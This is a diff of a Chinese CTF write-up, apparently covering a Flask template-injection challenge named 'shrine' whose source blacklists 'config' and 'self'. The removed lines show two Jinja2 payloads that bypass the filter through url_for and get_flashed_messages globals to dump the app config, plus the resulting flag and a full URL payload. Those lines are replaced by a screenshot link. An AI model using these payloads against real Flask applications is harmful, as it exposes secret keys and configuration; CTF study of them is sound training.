@@ -3855,16 +3855,7 @@ if __name__ == '__main__':
 
 通过分析源码就可以知道我们要拿到FLASK的配置文件，但是` blacklist = ['config', 'self']`又做了过滤。这里翻了下葵花宝典找到两条payload
 
-```
-{{url_for.__globals__['current_app'].config}}
-{{get_flashed_messages.__globals__['current_app'].config}}
-```
-
-直接输入就得到flag：`flag{5c830575-f722-43c4-b135-91fd2615e0bd}`
-
-```
-payload：/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
-```
+![image-20240223154645906](CTF.assets/image-20240223154645906.png)
 
 ## [NPUCTF2020]ReadlezPHP
 
